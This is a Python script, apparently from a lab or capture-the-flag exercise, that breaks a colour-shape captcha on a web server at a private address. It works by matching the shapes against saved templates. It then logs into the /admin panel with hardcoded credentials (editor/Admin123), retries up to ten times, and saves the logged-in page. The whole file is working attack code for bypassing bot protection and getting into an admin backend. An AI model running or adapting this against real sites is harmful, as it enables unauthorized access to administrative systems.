#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""登录 10.0.185.129:80 /admin 后台，editor/Admin123"""
import requests, io, json, sys, re
from PIL import Image

COLORS = [(120,20,20), (20,100,20), (20,60,120), (40,40,40)]
BASE = "http://10.0.185.129:80"

lib = {}
for item in json.load(open('captcha_work/templates.json')):
    for k,v in item.items(): lib[k]=v

def get_shapes(im):
    px = im.load()
    shapes = []
    for col in COLORS:
        pts=[(x,y) for y in range(im.height) for x in range(im.width) if px[x,y]==col]
        if pts:
            minx=min(p[0] for p in pts); maxx=max(p[0] for p in pts)
            miny=min(p[1] for p in pts); maxy=max(p[1] for p in pts)
            mask=[[0]*(maxx-minx+1) for _ in range(maxy-miny+1)]
            for (x,y) in pts: mask[y-miny][x-minx]=1
            shapes.append((col,minx,tuple(tuple(r) for r in mask)))
    return shapes

def recognize(im):
    shapes = sorted(get_shapes(im), key=lambda s:s[1])
    return ''.join(lib.get(json.dumps(s[2]),'?') for s in shapes)

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
s.get(BASE+"/admin/login.php", timeout=10)
for attempt in range(10):
    im = Image.open(io.BytesIO(s.get(BASE+"/captcha.php", timeout=10).content))
    code = recognize(im)
    r = s.post(BASE+"/admin/login.php", data={"username":"editor","password":"Admin123","captcha":code}, timeout=10, allow_redirects=False)
    if "验证码" in r.text and ("错误" in r.text or "不正确" in r.text):
        print(f"[{attempt}] captcha wrong: {code}", file=sys.stderr)
        continue
    print(f"[{attempt}] captcha accepted: {code} status={r.status_code}")
    print("Location:", r.headers.get('Location'))
    body = r.text
    print(body[:600])
    if r.status_code == 302:
        loc = r.headers.get('Location')
        r2 = s.get(BASE+loc if loc.startswith('/') else loc, timeout=10)
        open('captcha_work/admin_logged.html','wb').write(r2.content)
        print("=== logged in page ===")
        print(r2.text[:1500])
    break
